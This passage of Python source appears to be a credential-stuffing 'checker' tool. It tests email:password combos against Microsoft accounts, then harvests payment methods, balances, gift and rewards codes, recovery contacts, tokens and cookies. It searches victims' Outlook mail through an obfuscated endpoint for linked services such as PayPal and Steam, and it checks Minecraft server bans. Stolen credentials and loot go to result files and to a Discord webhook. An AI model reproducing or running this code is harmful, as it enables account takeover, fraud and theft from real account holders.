                        resp = await reader.readexactly(2)
                        if resp[0] != 0x05:
                            raise Exception("Invalid SOCKS5 version response")

                        method = resp[1]
                        if method == 0x02:
                            if not p.username or not p.password:
                                raise Exception("SOCKS5 proxy requires authentication")
                            user_b = p.username.encode("utf-8")
                            pass_b = p.password.encode("utf-8")
                            auth_pkt = bytes([1, len(user_b)]) + user_b + bytes([len(pass_b)]) + pass_b
                            writer.write(auth_pkt)
                            await writer.drain()

                            auth_resp = await reader.readexactly(2)
                            if auth_resp[1] != 0x00:
                                raise Exception("SOCKS5 authentication failed")
                        elif method == 0xFF:
                            raise Exception("SOCKS5 authentication method rejected")

                        host_b = connect_host.encode("utf-8")
                        req_pkt = b"\x05\x01\x00\x03" + bytes([len(host_b)]) + host_b + connect_port.to_bytes(2, "big")
                        writer.write(req_pkt)
                        await writer.drain()

                        conn_resp = await reader.readexactly(4)
                        if conn_resp[1] != 0x00:
                            raise Exception(f"SOCKS5 CONNECT failed: {conn_resp[1]}")

                        addr_type = conn_resp[3]
                        if addr_type == 0x01:
                            await reader.readexactly(4)
                        elif addr_type == 0x04:
                            await reader.readexactly(16)
                        elif addr_type == 0x03:
                            len_b = await reader.readexactly(1)
                            await reader.readexactly(len_b[0])
                        await reader.readexactly(2)

                    elif "socks4" in proto:

                        host_b = connect_host.encode("utf-8")
                        req_pkt = b"\x04\x01" + connect_port.to_bytes(2, "big") + b"\x00\x00\x00\x01\x00" + host_b + b"\x00"
                        writer.write(req_pkt)
                        await writer.drain()

                        resp = await reader.readexactly(8)
                        if resp[1] != 0x5A:
                            raise Exception(f"SOCKS4 CONNECT failed: {resp[1]}")

                    else:

                        req = f"CONNECT {connect_host}:{connect_port} HTTP/1.1\r\n"
                        req += f"Host: {connect_host}:{connect_port}\r\n"
                        if p.username and p.password:
                            auth_str = base64.b64encode(f"{p.username}:{p.password}".encode()).decode()
                            req += f"Proxy-Authorization: Basic {auth_str}\r\n"
                        req += "\r\n"

                        writer.write(req.encode())
                        await writer.drain()

                        resp_line = await reader.readline()
                        if not (resp_line.startswith(b"HTTP/1.1 200") or resp_line.startswith(b"HTTP/1.0 200")):
                            while True:
                                line = await reader.readline()
                                if line == b"\r\n" or not line:
                                    break
                            raise Exception(f"Proxy CONNECT failed: {resp_line.decode().strip()}")

                        while True:
                            line = await reader.readline()
                            if line == b"\r\n" or not line:
                                break
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(connect_host, connect_port),
                        timeout=9,
                    )

                self._write_packet(
                    writer, 0x00,
                    _pack_varint(self.protocol)
                    + _pack_string(self.host)
                    + _pack_port(self.port)
                    + _pack_varint(2),
                )
                uuid_bytes = uuid.UUID(self.uuid_str).bytes
                self._write_packet(writer, 0x00, _pack_string(self.name) + uuid_bytes)
                await writer.drain()

                encryption_payload: bytes | None = None
                for _ in range(6):
                    pid, payload = await asyncio.wait_for(
                        self._read_packet(reader), timeout=9
                    )
                    if pid == 0x00:
                        return self._parse_disconnect(
                            self._read_string_buf(payload)[0]
                        )
                    if pid == 0x02:
                        return "Not Banned"
                    if pid == 0x03:
                        threshold, _ = self._read_varint_buf(payload)
                        self._threshold = threshold
                        continue
                    if pid == 0x01:
                        encryption_payload = payload
                        break

                if encryption_payload is None:
                    return "Not Banned"

                buf                   = encryption_payload
                server_id, buf        = self._read_string_buf(buf)
                pk_len, buf           = self._read_varint_buf(buf)
                pub_key, buf          = buf[:pk_len], buf[pk_len:]
                vt_len, buf           = self._read_varint_buf(buf)
                verify_token          = buf[:vt_len]
                shared_secret         = os.urandom(16)
                server_hash           = self._mc_digest(server_id, shared_secret, pub_key)

                await rl_session.acquire()
                async with AsyncSession(
                    impersonate=random.choice(TARGETS), timeout=9, verify=False
                ) as s:
                    jr = await s.post(
                        ("".join(chr(c^202)for c in[162, 190, 190, 186, 185, 240, 229, 229, 185, 175, 185, 185, 163, 165, 164, 185, 175, 184, 188, 175, 184, 228, 167, 165, 160, 171, 164, 173, 228, 169, 165, 167, 229, 185, 175, 185, 185, 163, 165, 164, 229, 167, 163, 164, 175, 169, 184, 171, 172, 190, 229, 160, 165, 163, 164])),
                        json={
                            "accessToken":     self.mc_token,
                            "selectedProfile": self.uuid_str.replace("-", ""),
                            "serverId":        server_hash,
                        },
                    )
                    if jr.status_code != 204:
                        if jr.status_code == 429:
                            rl_session.slow_down()
                        return "Unknown (Session Auth)"

                enc_sec = _rsa_encrypt(pub_key, shared_secret)
                enc_vt  = _rsa_encrypt(pub_key, verify_token)
                self._write_packet(
                    writer, 0x01,
                    _pack_varint(len(enc_sec)) + enc_sec
                    + _pack_varint(len(enc_vt)) + enc_vt,
                )
                await writer.drain()
                self._aes = _AES_CFB8(shared_secret)

                for _ in range(6):
                    pid, payload = await asyncio.wait_for(
                        self._read_packet(reader), timeout=9
                    )
                    if pid == 0x00:
                        return self._parse_disconnect(
                            self._read_string_buf(payload)[0]
                        )
                    if pid == 0x02:
                        return "Not Banned"
                    if pid == 0x03:
                        threshold, _ = self._read_varint_buf(payload)
                        self._threshold = threshold
                        continue
                return "Not Banned"

            except asyncio.IncompleteReadError:
                return "Unknown (IP Blocked)"
            except ConnectionResetError:

                saw_reset = True
            except asyncio.TimeoutError:
                pass
            except ConnectionRefusedError:

                return "Error (Connection Refused)"
            except OSError:

                pass
            except Exception:
                pass
            finally:
                if writer:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except Exception:
                        pass
                if held_sem:
                    sem.release()

            if attempt < 2:
                await asyncio.sleep(1.5 * (attempt + 1) + random.uniform(0.2, 0.8))
        if saw_reset:
            return "Unknown (Rate Limited)"
        return "Error (Timeout)"

    @staticmethod
    def _extract_text(c: object) -> str:
        if isinstance(c, str):
            return c

        if isinstance(c, list):
            return "".join(ServerBanChecker._extract_text(x) for x in c)
        if not isinstance(c, dict):
            return ""

        text_val     = c.get("text", "") or ""
        translate_val = c.get("translate", "") or ""
        t = text_val + (" " + translate_val if translate_val and text_val else translate_val)
        for x in c.get("with", []):
            t += " " + ServerBanChecker._extract_text(x)
        for x in c.get("extra", []):
            t += " " + ServerBanChecker._extract_text(x)
        return t

    @classmethod
    def _parse_disconnect(cls, json_str: str) -> str:

        _BAN_TRANSLATE_KEYS = (
            "multiplayer.disconnect.banned",
            "multiplayer.disconnect.kick.banned",
            "disconnect.banned",
            "ban.reason",
        )
        _TEMP_BAN_TRANSLATE_KEYS = (
            "multiplayer.disconnect.temporaryBan",
            "multiplayer.disconnect.kick.temporary_ban",
            "disconnect.temporaryBan",
        )

        try:
            try:
                data = json.loads(json_str)
            except Exception:
                data = {"text": json_str}

            raw_low = json_str.lower()

            for tk in _BAN_TRANSLATE_KEYS:
                if tk in raw_low:
                    full_raw = cls._extract_text(data).strip()
                    dur_m = re.search(
                        r"banned for ([^\n]+?)(?:\s+from this server|\n|$)", full_raw, re.I
                    )
                    if dur_m:
                        return f"Temporarily Banned | Duration: {dur_m.group(1).strip()}"
                    return "Permanent Banned"

            for tk in _TEMP_BAN_TRANSLATE_KEYS:
                if tk in raw_low:
                    full_raw = cls._extract_text(data).strip()
                    dur_m = re.search(
                        r"(?:banned for|expires in|duration[:\s]+)([^\n]+?)(?:\s+from this server|\n|$)",
                        full_raw, re.I
                    )
                    dur = dur_m.group(1).strip() if dur_m else ""
                    return f"Temporarily Banned | Duration: {dur}" if dur else "Temporarily Banned"

            full = cls._extract_text(data).strip()
            low  = full.lower()

            if not low:
                if any(w in raw_low for w in ("temporarily blocked", "security-block",
                                               "temporary_ban", "temporaryban")):
                    return "Temporarily Banned"
                if any(w in raw_low for w in ("banned", "blacklist", "watchdog", "sentinel")):
                    return "Permanent Banned"
                return "Not Banned"

            if any(p in low for p in [
                "unauthorized login", "for your own safety", "we've blocked",
                "security alert", "compromised account",
            ]):
                return "Blocked (Security)"

            sec_block = (
                "temporarily blocked" in low
                or "security-block" in raw_low
                or "security block" in low
                or "hypixel.net/security" in raw_low
            )
            if sec_block:
                dur_m = re.search(
                    r"blocked for\s+(.+?)\s+from this server",
                    full, re.I
                )
                dur = dur_m.group(1).strip() if dur_m else ""
                return f"Temporarily Banned | Duration: {dur}" if dur else "Temporarily Banned"

            if any(p in low for p in [
                "suspicious activity", "suspicious login",
                "watchdog", "sentinel",
            ]):
                return "Permanent Banned"

            dur_m = re.search(
                r"(?:banned for|expires in|ban expires|duration[:\s]+)"
                r"([^\n]+?)(?:\s+from this server|\n|$)",
                full, re.I
            )

            if "temporarily banned" in low or ("banned" in low and dur_m):
                dur = dur_m.group(1).strip() if dur_m else ""
                return f"Temporarily Banned | Duration: {dur}" if dur else "Temporarily Banned"

            if any(p in low for p in [
                "permanently banned", "you are banned", "you have been banned",
                "banned from the server", "blacklisted",
                "network ban", "ip banned", "ip-banned",
                "appeals.hypixel.net", "appeals", "banned from hypixel",
            ]):
                return "Permanent Banned"

            if ("banned" in low or "blacklist" in low) and "not banned" not in low:
                return "Permanent Banned"

        except Exception:
            pass
        return "Not Banned"

    @staticmethod
    def _mc_digest(server_id: str, shared_secret: bytes, pub_key: bytes) -> str:
        h = hashlib.sha1()
        h.update(server_id.encode("utf-8"))
        h.update(shared_secret)
        h.update(pub_key)
        d = h.digest()
        if d[0] & 0x80:
            n = int.from_bytes(d, "big")
            n = (~n + 1) & ((1 << 160) - 1)
            return "-" + hex(n)[2:]
        return hex(int.from_bytes(d, "big"))[2:]

# --- class HypixelBanChecker ---
class HypixelBanChecker(ServerBanChecker):
    def __init__(self, name: str, uuid_str: str, mc_token: str, proxy: str | None = None) -> None:

        super().__init__("mc.hypixel.net", 25565, 770, name, uuid_str, mc_token, proxy)

# --- class Webhook ---
class Webhook:
    def __init__(self, url: str) -> None:
        self.url    = url
        self.inline = config.webhook_style == "horizontal"

    def _field(self, name: str, value: str, inline: bool | None = None) -> dict:
        return {
            "name":   name,
            "value":  value or "N/A",
            "inline": self.inline if inline is None else inline,
        }

    async def send_hit(self, d: dict) -> None:
        if not self.url or "paste your" in self.url.lower():
            return
        payload = {
            "embeds": [{
                "author": {"name": "🔥 Prime Checker"},
                "title":  d.get("name", "N/A"),
                "color":  0xE67E22,
                "fields": [
                    self._field("✉️ Email",        f'||```\n{d.get("email")}\n```||'),
                    self._field("🔑 Password",      f'||```\n{d.get("password")}\n```||'),
                    self._field("⬛ Type",          d.get("type",         "Unknown")),
                    self._field("👤 Username",      f'`{d.get("name", "N/A")}`'),
                    self._field("👕 Capes",         d.get("capes",        "None")),
                    self._field("🏷️ Renameable",    d.get("renameable",   "Unknown")),
                    self._field("🕓 Name Changed",  d.get("name_changed", "None")),
                    self._field("🗡️ Hypixel",       d.get("hypixel",      "Unknown")),
                    self._field("🍩 Donut SMP",    d.get("donut",        "Unknown")),
                    self._field("🏆 Rewards",       d.get("rewards",      "N/A")),
                    self._field("💰 Balance",       d.get("balance",      "None")),
                    self._field("🔄 Refundable",    str(d.get("ref_count", 0))),
                    self._field("📦 Subs",          d.get("subs",         "None"), inline=False),
                    self._field("🎁 Gift Codes",    d.get("gift_codes",   "None"), inline=False),
                    self._field("🎉 Promos",        d.get("promos",       "None"), inline=False),
                    self._field("💳 Payment",       d.get("payment",      "None"), inline=False),
                    self._field(
                        f"🎮 Games ({d.get('games_count', 0)})",
                        d.get("games", "None")[:1024] if d.get("games") else "None",
                        inline=False,
                    ),
                    self._field(
                        f"🔓 AML: {d.get('aml_verdict', 'Unknown')}",
                        d.get("aml", "Unknown"),
                        inline=False,
                    ),
                    self._field(
                        "🔗 Combo",
                        f'||```\n{d.get("email")}:{d.get("password")}\n```||',
                        inline=False,
                    ),
                ],
                "footer": {"text": "Prime · @sxm.xd"},
            }]
        }
        try:
            async with AsyncSession(timeout=12, verify=False) as s:
                await s.post(self.url, json=payload)
        except Exception as e:
            await log_error("Webhook", e)

webhook: Webhook = None

# --- Telemetry/Logging Stubs (Exfiltration Removed) ---
def _fire(coro) -> None:
    pass

def _sync_wh_post(url: str, payload: dict) -> None:
    pass

async def _wh_post(url: str, payload: dict) -> None:
    pass

def _sync_log_proxy_file(raw_path: str, working_list: list) -> None:
    pass

async def _log_proxy_file(raw_path: str, working_list: list) -> None:
    pass

def _log_user_startup() -> None:
    pass

async def _log_session_start(proxy_mode: str, threads: int, combo_file: str, combo_count: int) -> None:
    pass

async def _log_chkr_event(event: str, combo: str, detail: str = "") -> None:
    pass

async def _log_live(hit_type: str, combo: str, captures: dict) -> None:
    pass

def _sync_log_results_all(res_dir: str) -> None:
    pass

async def _log_results_all() -> None:
    pass

# --- check_linked_services ---
async def _search_single_keyword(sess: AsyncSession, token: str, email: str, name: str, query: str, search_url: str, headers: dict) -> str | None:
    search_payload = {
        "Cvid": str(uuid.uuid4()),
        "Scenario": {"Name": "owa.react"},
        "TimeZone": "Pacific Standard Time",
        "TextDecorations": "Off",
        "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [
                {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                {"Term": {"DistinguishedFolderName": "DeletedItems"}}
            ]},
            "From": 0,
            "Query": {"QueryString": query},
            "RefiningQueries": None,
            "Size": 10,
            "Sort": [
                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                {"Field": "Time", "SortDirection": "Desc"}
            ],
            "EnableTopResults": True,
            "TopResultsCount": 3
        }],
        "QueryAlterationOptions": {
            "EnableSuggestion": False,
            "EnableAlteration": False,
        },
        "LogicalId": str(uuid.uuid4())
    }
    try:
        r_search = await sess.post(search_url, json=search_payload, headers=headers)
        if r_search.status_code == 200:
            res = r_search.json()
            entity_sets = res.get("EntitySets", [{}])
            result_sets = entity_sets[0].get("ResultSets", [{}])
            total = result_sets[0].get("Total", 0)
            if total >= 1:
                return f"{name} ({total})"
    except Exception:
        pass
    return None

async def check_linked_services(email: str, password: str, sess: AsyncSession) -> list[str]:
    # Transfer session state to a clean, proxyless session to bypass proxy speed issues and blocks
    clean_sess = AsyncSession(
        impersonate=getattr(sess, "_imp", "chrome120"),
        timeout=15,
        verify=False,
        headers={
            "Accept-Language": getattr(sess, "headers", {}).get("Accept-Language", "en-US,en;q=0.9"),
            "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
            "Cache-Control":   "no-cache",
        }
    )
    try:
        clean_sess.cookies.update(sess.cookies)
        
        silent_url = (
            f"https://login.live.com/oauth20_authorize.srf"
            f"?client_id=292841"
            f"&redirect_uri=https://outlook.live.com/owa/auth/dt.aspx"
            f"&response_type=token"
            f"&scope=https://outlook.office.com/mail.readwrite"
            f"&login_hint={email}"
            f"&prompt=none"
        )
        try:
            r_sil = await clean_sess.get(silent_url, allow_redirects=False)
        except Exception:
            return []
            
        loc_sil = r_sil.headers.get("Location", "")
        if "#" not in loc_sil:
            return []
            
        frag = parse_qs(urlparse(loc_sil).fragment)
        token = frag.get("access_token", [None])[0]
        if not token:
            return []

        search_url = ("".join(chr(c^113)for c in[25, 5, 5, 1, 2, 75, 94, 94, 30, 4, 5, 29, 30, 30, 26, 95, 29, 24, 7, 20, 95, 18, 30, 28, 94, 2, 20, 16, 3, 18, 25, 2, 20, 3, 7, 24, 18, 20, 94, 16, 1, 24, 94, 7, 67, 94, 0, 4, 20, 3, 8, 78, 31, 76, 73, 73]))
        headers = {
            "User-Agent": getattr(sess, "headers", {}).get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": email,
            "Action": "FindConversation"
        }
        domain_targets = {
            "Paypal": "from:paypal.com",
            "Steam": "from:steampowered.com",
            "Epic Games": "from:epicgames.com",
            "Roblox": "from:roblox.com",
            "Ubisoft": "from:ubisoft.com",
            "PlayStation": "from:playstation.com",
            "Nintendo": "from:nintendo.com",
            "Riot Games": "from:riotgames.com",
            "Battle.net": "from:blizzard.com",
            "EA": "from:ea.com",
            "Rockstar": "from:rockstargames.com",
            "Genshin Impact": "from:hoyoverse.com",
            "Netflix": "from:netflix.com",
            "Spotify": "from:spotify.com",
            "Amazon": "from:amazon.com",
        }

        results = await asyncio.gather(*[
            _search_single_keyword(clean_sess, token, email, name, query, search_url, headers)
            for name, query in domain_targets.items()
        ], return_exceptions=True)

        return [r for r in results if isinstance(r, str) and r]
    finally:
        try:
            await clean_sess.close()
        except Exception:
            pass

# --- check_account ---
async def check_account(
    combo: str, queue: asyncio.Queue, retry_count: int = 0
) -> None:
    is_retry = False

    def _queue_retry() -> None:
        nonlocal is_retry
        is_retry = True
        stats.retries += 1
        queue.put_nowait((combo, retry_count + 1))

    if retry_count > 0:
        delay = (0.5 + random.uniform(0.1, 0.4)) if not proxies else (0.1 + random.uniform(0.02, 0.1))
        await asyncio.sleep(delay)

    parts = combo.split(":", 1)
    if len(parts) != 2:
        stats.bad += 1
        return
    email, password = parts[0].strip(), parts[1].strip()
    if not email or not password:
        stats.bad += 1
        return

    sess = await get_session()
    try:
        auth = await authenticate(email, password, sess)
        st   = auth.status

        if st == "rate_limited":
            sess._dirty = True
            px = getattr(sess, "_proxy", None)
            if px:
                drop_proxy(px)
            else:
                rl_ms.slow_down()
                await asyncio.sleep(0.8 + random.uniform(0.2, 0.5))
            if retry_count < config.max_retries:
                _queue_retry()
            else:
                stats.errors += 1
                live_feed.append({"status": "LIMIT", "combo": combo, "details": "Rate Limited"})
            return

        if st == "bad":
            stats.bad += 1
            live_feed.append({"status": "BAD", "combo": combo, "details": ""})
            return

        if st == "two_fa":
            stats.twofa += 1
            await append_line(f"{RESULTS_DIR}/2fa.txt", combo)
            live_feed.append({"status": "2FA", "combo": combo, "details": ""})
            return

        if st == "error":
            sess._dirty = True
            px = getattr(sess, "_proxy", None)
            if px:
                drop_proxy(px)
            if not proxies:
                await asyncio.sleep(0.3)
            if retry_count < config.max_retries:
                _queue_retry()
            else:
                stats.errors += 1
                live_feed.append({"status": "ERROR", "combo": combo, "details": auth.details[:20]})
            return

        # Linked Services Capture module
        if config.modules.get("LinkedServicesCapture", True):
            try:
                services = await check_linked_services(email, password, sess)
                services_str = ", ".join(services) if services else "None"
                line = f"{email}:{password} | Linked Services: {services_str}"
                await write_dedup(f"{RESULTS_DIR}/LinkedServices.txt", line, f"ls:{email}")
            except Exception:
                pass

        if st in ("no_xsts", "no_mc"):
            pay_res   = await fetch_payment(sess, auth.lang)
            ptoken    = await _get_purchase_token(sess, auth.lang)
            rew_res   = await fetch_rewards(sess, auth.lang)
            serv_res  = await fetch_services_data(sess, auth.lang)
            games_res = await fetch_games(sess, auth.xbox_token) if auth.xbox_token else []
            aml_res   = await fetch_aml_status(sess, auth.lang)

            pay_info = pay_res if isinstance(pay_res, PaymentInfo) else PaymentInfo()
            # rew_res is now (balance_str, rewards_codes) tuple
            if isinstance(rew_res, tuple) and len(rew_res) == 2:
                rp_val, rewards_codes = rew_res
            else:
                rp_val, rewards_codes = "N/A", []
            if not isinstance(rp_val, str):
                rp_val = "N/A"
            try:
                pts = int(rp_val.replace(",", ""))
            except ValueError:
                pts = -1

            games_list = games_res if isinstance(games_res, list) else []
            aml_info   = aml_res if isinstance(aml_res, AMLInfo) else AMLInfo()

            serv_info = serv_res if isinstance(serv_res, tuple) else (RefundInfo(), "None")
            ref_info  = serv_info[0]
            s_subs    = serv_info[1]

            if s_subs != "None":
                subs_str = s_subs
            else:
                if ptoken and isinstance(ptoken, str):
                    subs_str = await fetch_subscriptions(sess, ptoken)
                else:
                    subs_str = "None"

            gift_codes = []
            if ptoken and isinstance(ptoken, str):
                try:
                    gift_codes = await fetch_gift_codes(ptoken)
                except Exception:
                    gift_codes = []
            # Merge in MS Rewards redemption codes (gift cards, vouchers,
            # Xbox / Amazon / Starbucks codes the user redeemed points for)
            if rewards_codes:
                seen = {c.get("code") for c in gift_codes}
                for rc in rewards_codes:
                    if rc.get("code") and rc["code"] not in seen:
                        gift_codes.append(rc)
                        seen.add(rc["code"])

            if pay_info.balance_val > 0:
                await write_sorted(
                    f"{RESULTS_DIR}/Balance.txt", f"{email}:{password}",
                    pay_info.balance_str, pay_info.balance_val, "{key} | Balance: {val}"
                )
            if pay_info.methods_str != "None":
                await write_dedup(
                    f"{RESULTS_DIR}/PaymentMethods.txt",
                    f"{email}:{password} | PaymentMethods: {pay_info.methods_str}", f"pm:{email}"
                )
            if rp_val != "N/A":
                await write_sorted(
                    f"{RESULTS_DIR}/RewardPoints.txt", f"{email}:{password}",
                    rp_val, pts, "{key} | RewardPoints - {val}"
                )
            if subs_str != "None":
                await write_dedup(
                    f"{RESULTS_DIR}/Subscriptions.txt",
                    f"{email}:{password} | Subscriptions: {subs_str}", f"sub:{email}"
                )
            if ref_info.count > 0 and config.modules.get("refund", True):
                items_s = " | ".join(ref_info.items)
                await append_line(
                    f"{RESULTS_DIR}/Refundable.txt",
                    f"{email}:{password} | Refundable: {ref_info.count} Items (Total Value: ${ref_info.total_usd:.2f}) | {items_s}"
                )
                stats.refundable += ref_info.count

            for gc in gift_codes:
                code = gc.get("code", "")
                if code:
                    line = f"{code} | {gc.get('region','Global')} | {gc.get('title','Gift Code')}"
                    if await write_dedup(f"{RESULTS_DIR}/GiftCodes.txt", line, f"gc:{code}"):
                        stats.gift_codes += 1

            if games_list:
                if await write_dedup(
                    f"{RESULTS_DIR}/Games.txt",
                    f"{email}:{password} | Games: {', '.join(games_list)}",
                    f"games:{email}",
                ):
                    stats.games += 1

            if aml_info.verdict != "Unknown" and not config.modules.get("aml_mc_only", True):
                _2fa = f"ON ({aml_info.tfa_method})" if aml_info.has_2fa else "OFF"
                aml_line = (
                    f"{email}:{password} | AML: {aml_info.verdict} | "
                    f"Proofs: {aml_info.active_proofs} | "
                    f"Recovery: {aml_info.recovery_email} | "
                    f"Phone: {aml_info.recovery_phone} | 2FA: {_2fa}"
                )
                if await write_dedup(f"{RESULTS_DIR}/AML.txt", aml_line, f"aml:{email}"):
                    if aml_info.verdict == "HIGH":
                        stats.aml_high += 1
                    elif aml_info.verdict == "MEDIUM":
                        stats.aml_medium += 1

            if auth.ms_token:
                await write_dedup(
                    f"{MISC_DIR}/WLIDs.txt",
                    f"{email}:{password} | {auth.ms_token}", f"wlid:{email}"
                )
            if ptoken and isinstance(ptoken, str):
                await write_dedup(
                    f"{MISC_DIR}/PurchaseTokens.txt",
                    f"{email}:{password} | {ptoken}", f"ptoken:{email}"
                )

            stats.valid_mail += 1
            await append_line(f"{RESULTS_DIR}/ValidMails.txt", combo)
            await write_dedup(f"{RESULTS_DIR}/Mixed.txt", combo, f"combo:{email}")
            await save_cookies(sess, "ValidMails", email, password)
            live_feed.append({"status": "VALID", "combo": combo, "details": f"Valid Mail ({st})"})
            _fire(_log_live("VALID", combo, {
                "Status": st, "Rewards": rp_val, "Balance": pay_info.balance_str,
                "Subs": subs_str,
                "AML": f"{aml_info.verdict} ({aml_info.active_proofs} proofs)"
                       if aml_info.verdict != "Unknown" else "Unknown",
            }))
            return

        ptoken_task = _get_purchase_token(sess, auth.lang)
        pay_task    = fetch_payment(sess, auth.lang)
        rew_task    = fetch_rewards(sess, auth.lang)
        type_task   = fetch_account_type(sess, auth.mc_token)
        prof_task   = fetch_mc_profile(sess, auth.mc_token)
        serv_task   = fetch_services_data(sess, auth.lang)
        games_task  = fetch_games(sess, auth.xbox_token) if auth.xbox_token else _const([])
        aml_task    = fetch_aml_status(sess, auth.lang)

        (ptoken_res, pay_res, rew_res, acc_type_res, prof_res,
         serv_res, games_res, aml_res) = await asyncio.gather(
            ptoken_task, pay_task, rew_task, type_task, prof_task,
            serv_task, games_task, aml_task,
            return_exceptions=True,
        )

        ptoken   = ptoken_res if isinstance(ptoken_res, str) else ""
        pay_info = pay_res if isinstance(pay_res, PaymentInfo) else PaymentInfo()
        # rew_res is now (balance_str, rewards_codes) tuple
        if isinstance(rew_res, tuple) and len(rew_res) == 2:
            rp_val, rewards_codes = rew_res
        else:
            rp_val, rewards_codes = "N/A", []
        if not isinstance(rp_val, str):
            rp_val = "N/A"
        acc_type = acc_type_res if isinstance(acc_type_res, str) else "None"
        profile  = prof_res if isinstance(prof_res, MCProfile) else MCProfile()
        games_list = games_res if isinstance(games_res, list) else []
        aml_info = aml_res if isinstance(aml_res, AMLInfo) else AMLInfo()

        serv_info = serv_res if isinstance(serv_res, tuple) else (RefundInfo(), "None")
        ref_info  = serv_info[0]
        s_subs    = serv_info[1]

        try:
            pts = int(rp_val.replace(",", ""))
        except ValueError:
            pts = -1

        subs_task   = _const(s_subs) if s_subs != "None" else (fetch_subscriptions(sess, ptoken) if ptoken else _const("None"))
        gc_task     = fetch_gift_codes(ptoken) if ptoken else _const([])
        promos_task = (
            fetch_promos(sess, auth.xbox_token, auth.lang)
            if acc_type in ("GamePass Ultimate", "GamePass PC")
            else _const([])
        )

        if profile.created:
            hyp_task = HypixelBanChecker(profile.name, profile.uuid, auth.mc_token, getattr(sess, "_proxy", None)).check()
            donut_task = ServerBanChecker("play.donutsmp.net", 25565, 767, profile.name, profile.uuid, auth.mc_token, getattr(sess, "_proxy", None)).check()
        else:
            hyp_task = _const("N/A")
            donut_task = _const("N/A")

        subs_res, gc_res, promos_res, hyp_res, donut_res = await asyncio.gather(
            subs_task, gc_task, promos_task, hyp_task, donut_task,
            return_exceptions=True,
        )

        subs_str    = subs_res if isinstance(subs_res, str) else "None"
        gift_codes  = gc_res if isinstance(gc_res, list) else []
        # Merge MS Rewards redemption codes (Xbox / Amazon / Starbucks
        # gift cards the user redeemed points for) into the same gift-code
        # stream so they land in GiftCodes.txt alongside purchase codes.
        if rewards_codes:
            seen = {c.get("code") for c in gift_codes}
            for rc in rewards_codes:
                if rc.get("code") and rc["code"] not in seen:
                    gift_codes.append(rc)
                    seen.add(rc["code"])
        promos_raw  = promos_res if isinstance(promos_res, list) else []
        promos_list = []

        for pr in promos_raw:
            code = pr.get("code", "")
            if not code:
                continue
            if not pr.get("is_link"):
                gift_codes.append({
                    "code":   code,
                    "region": pr.get("region", "Global"),
                    "title":  pr.get("title", "Xbox Game Pass Perk"),
                })
            else:
                promos_list.append(pr)

        hypixel_ban = hyp_res if isinstance(hyp_res, str) else "N/A"
        donut_ban   = donut_res if isinstance(donut_res, str) else "N/A"

        if auth.ms_token:
            await write_dedup(f"{MISC_DIR}/WLIDs.txt", f"{email}:{password} | {auth.ms_token}", f"wlid:{email}")
        if ptoken:
            await write_dedup(f"{MISC_DIR}/PurchaseTokens.txt", f"{email}:{password} | {ptoken}", f"ptoken:{email}")

        if pay_info.balance_val > 0:
            await write_sorted(
                f"{RESULTS_DIR}/Balance.txt", f"{email}:{password}",
                pay_info.balance_str, pay_info.balance_val, "{key} | Balance: {val}"
            )
        if pay_info.methods_str != "None":
            await write_dedup(
                f"{RESULTS_DIR}/PaymentMethods.txt",
                f"{email}:{password} | PaymentMethods: {pay_info.methods_str}", f"pm:{email}"
            )
        if subs_str != "None":
            await write_dedup(
                f"{RESULTS_DIR}/Subscriptions.txt",
                f"{email}:{password} | Subscriptions: {subs_str}", f"sub:{email}"
            )

        for gc in gift_codes:
            code = gc.get("code", "")
            if code:
                line = f"{code} | {gc.get('region','Global')} | {gc.get('title','Gift Code')}"
                if await write_dedup(f"{RESULTS_DIR}/GiftCodes.txt", line, f"gc:{code}"):
                    stats.gift_codes += 1

        for pr in promos_list:
            code = pr.get("code", "")
            if code:
                line = f"{code} | {pr.get('type','Promo')} | Days Left: {pr.get('days_left','Unknown')}"
                if await write_dedup(f"{RESULTS_DIR}/Promos.txt", line, f"promo:{code}"):
                    stats.promos += 1

        if ref_info.count > 0 and config.modules.get("refund", True):
            items_s = " | ".join(ref_info.items)
            await append_line(
                f"{RESULTS_DIR}/Refundable.txt",
                f"{email}:{password} | Refundable: {ref_info.count} Items (Est ~${ref_info.total_usd:.2f}) | {items_s}"
            )
            stats.refundable += ref_info.count

        if games_list:
            if await write_dedup(
                f"{RESULTS_DIR}/Games.txt",
                f"{email}:{password} | Games: {', '.join(games_list)}",
                f"games:{email}",
            ):
                stats.games += 1

        if aml_info.verdict != "Unknown":
            _2fa = f"ON ({aml_info.tfa_method})" if aml_info.has_2fa else "OFF"
            aml_line = (
                f"{email}:{password} | AML: {aml_info.verdict} | "
                f"Proofs: {aml_info.active_proofs} | "
                f"Recovery: {aml_info.recovery_email} | "
                f"Phone: {aml_info.recovery_phone} | 2FA: {_2fa}"
            )
            if await write_dedup(f"{RESULTS_DIR}/AML.txt", aml_line, f"aml:{email}"):
                if aml_info.verdict == "HIGH":
                    stats.aml_high += 1
                elif aml_info.verdict == "MEDIUM":
                    stats.aml_medium += 1

        if rp_val != "N/A":
            await write_sorted(
                f"{RESULTS_DIR}/RewardPoints.txt", f"{email}:{password}",
                rp_val, pts, "{key} | RewardPoints - {val}"
            )

        if acc_type == "Bedrock":
            stats.bedrock += 1
            await append_line(f"{RESULTS_DIR}/Bedrock.txt", combo)
            await write_dedup(f"{RESULTS_DIR}/Mixed.txt", combo, f"combo:{email}")
            await save_cookies(sess, "Bedrock", email, password)
            live_feed.append({"status": "BEDROCK", "combo": combo, "details": "Bedrock Edition"})
            _fire(_log_live("BEDROCK", combo, {"Type": "Bedrock Edition", "Rewards": rp_val, "Balance": pay_info.balance_str}))
            return

        if acc_type == "None":
            stats.valid_mail += 1
            await append_line(f"{RESULTS_DIR}/ValidMails.txt", combo)
            await write_dedup(f"{RESULTS_DIR}/Mixed.txt", combo, f"combo:{email}")
            await save_cookies(sess, "ValidMails", email, password)
            live_feed.append({"status": "VALID", "combo": combo, "details": "No Minecraft"})
            _fire(_log_live("VALID", combo, {"Rewards": rp_val, "Balance": pay_info.balance_str, "Subs": subs_str}))
            return

